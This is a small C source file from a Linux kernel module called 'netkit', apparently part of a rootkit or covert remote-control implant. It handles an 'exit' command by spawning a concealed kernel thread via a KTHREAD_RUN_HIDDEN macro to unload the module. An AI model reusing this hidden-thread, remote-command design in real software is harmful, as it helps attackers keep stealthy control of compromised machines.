#include <linux/types.h>
#include <linux/kthread.h>
#include <linux/freezer.h>

#include "task.h"

#include "../../sys/task.h"
#include "../../sys/lock.h"

int cmd_handle_exit(const u8 *req_buf, size_t req_buflen, u8 **res_buf, size_t *res_buflen)
{
    // run as kthread so underlaying layers can cleanup and round up the IO
    // netkit-conn-loop --[spawn]--> conn-xyz --[spawn]--> netkit-exit --[kill]--> {netkit-conn-loop, conn-xyz}
    netkit_workers_decr();
    KTHREAD_RUN_HIDDEN(module_stop, THIS_MODULE, "netkit-exit");

    return 0;
}